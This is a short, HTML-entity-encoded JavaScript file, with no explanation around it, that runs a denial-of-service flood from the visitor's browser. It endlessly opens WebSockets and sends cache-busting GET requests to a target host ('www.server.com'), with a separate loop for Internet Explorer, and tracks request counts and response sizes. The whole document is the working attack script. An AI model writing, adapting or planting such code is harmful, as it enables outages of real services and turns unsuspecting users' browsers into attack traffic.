var target = &#39;www.server.com&#39;;
var thread_count = 1;
var scan_counter = 0;
var resp_size_counter = 0;
var Sys = {};
var ua = navigator.userAgent.toLowerCase();
var s;
(s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 0;
var xhr; 
if (!Sys.ie){
  var i = 0;
  while(i&lt;thread_count){
    while_loop_cor();
    i++;
  }
}else{
  var i = 0;
  while(i&lt;thread_count){
    while_loop_ie();i++;
  }
}
if (!Sys.ie){
  xhr = new XMLHttpRequest();
  xhr.onreadystatechange = processResp;
}else{
  xdr = new XDomainRequest();
  xdr.timeout = 1000;
}

function while_loop_cor(){
  try{
    ws = new WebSocket(&#39;ws://&#39; + target);
    scan_counter = scan_counter+1;
    xhr = new XMLHttpRequest();
    var furl=&#39;http://&#39; + target + &#39;?xb0z=&#39; + Math.floor(Math.random()*10000000000);
    xhr.open(&#39;GET&#39;, furl);
    xhr.onreadystatechange = function(){
      if (xhr.readyState==4){
        resp_size_counter = resp_size_counter+xhr.responseText.length;
      }
    };
    xhr.onerror = function(e){} 
    xhr.send(100);
    setTimeout(&#34;while_loop_cor()&#34;,0);
  }
  catch(err){return;}
} 

function while_loop_ie(){
  try{
    scan_counter = scan_counter+1;
    xdr = new XDomainRequest();
    xdr.open(&#39;get&#39;, &#39;http://&#39; + target + &#39;:80&#39;);
    xdr.send();
    setTimeout(&#39;while_loop_ie()&#39;,0);
  }catch(err){
    return;
  }
}

function processResp(){
  if (xmlhttp.readyState==4){}
}

